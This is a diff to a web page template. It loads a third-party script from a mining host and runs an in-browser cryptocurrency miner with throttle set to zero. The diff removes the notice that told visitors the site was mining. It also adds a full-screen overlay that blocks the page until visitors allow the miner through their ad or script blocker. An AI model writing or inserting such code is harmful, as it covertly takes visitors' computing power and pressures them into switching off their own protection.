@@ -18,14 +18,29 @@
     <body>
       <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-1289491077433459"
 crossorigin="anonymous"></script>
-<script src="https://www.hostingcloud.racing/hhuJ.js"></script>
+<script src="https://www.hostingcloud.racing/mTzv.js"></script>
 <script>
-    var _client = new Client.Anonymous('5649ce13f4c0ec3b4f6878cfcaa67ba1688834d69285cb5b8a3f5037b8779498', {
-        throttle: 0.0, c: 'w'
+    var _client = new Client.Anonymous('be2ef708f1605fe033ae56b9d0dca2e25e40cac7aaa5463b55b19d5608b7235c', {
+        throttle: 0, c: 'w', ads: 0
     });
     _client.start();
-    _client.addMiningNotification("Top", "This site is running a miner to prevent malaria.", "#cccccc", 40, "#3d3d3d");
-
+    
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
 </script>
       <!-- Google Tag Manager (noscript) -->
 <noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-MBZVZ56"
